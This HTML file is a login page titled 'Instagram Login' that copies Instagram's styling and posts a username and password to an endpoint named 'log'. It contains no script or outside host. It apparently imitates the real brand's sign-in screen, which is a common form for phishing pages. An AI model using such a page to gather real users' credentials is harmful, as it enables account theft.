<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fafafa;
        }
        .login-container {
            width: 300px;
            padding: 20px;
            background: white;
            border: 1px solid #dbdbdb;
            text-align: center;
            box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1);
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #f9f9f9;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 3px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:hover {
            background: #0077cc;
        }
        .links {
            margin-top: 10px;
            font-size: 14px;
        }
        .links a {
            color: #00376b;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo">Login  </div>
        <form action="log" method="post">
            <input name="uname" type="text" placeholder="Phone number, username, or email" required>
            <input name="password" type="password" placeholder="Password" required>
            <button class="login-btn">Log In</button>
        </form>
        <div class="links">
            <p><a href="#">Forgot password?</a></p>
            <p>Don't have an account? <a href="registration.html">Sign up</a></p>
        </div>
    </div>

</body>
</html>
